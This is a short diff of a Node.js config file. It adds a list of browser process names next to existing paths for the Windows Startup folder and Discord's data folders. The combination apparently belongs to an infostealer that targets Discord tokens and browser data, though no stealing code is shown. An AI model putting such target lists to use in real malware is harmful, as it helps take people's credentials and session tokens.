@@ -2,6 +2,10 @@ const { join } = require('path');
 
 module.exports = {
   startupPrograms: join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+  browsersProcesses: [
+    'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum', 'centbrowser', '7star', 'sputnik', 'vivaldi',
+    'epicprivacybrowser', 'uran', 'yandex', 'iridium'
+  ],
   browsers: {
     'Discord': join(process.env.APPDATA, 'discord'),
     'Discord Canary': join(process.env.APPDATA, 'discordcanary'),
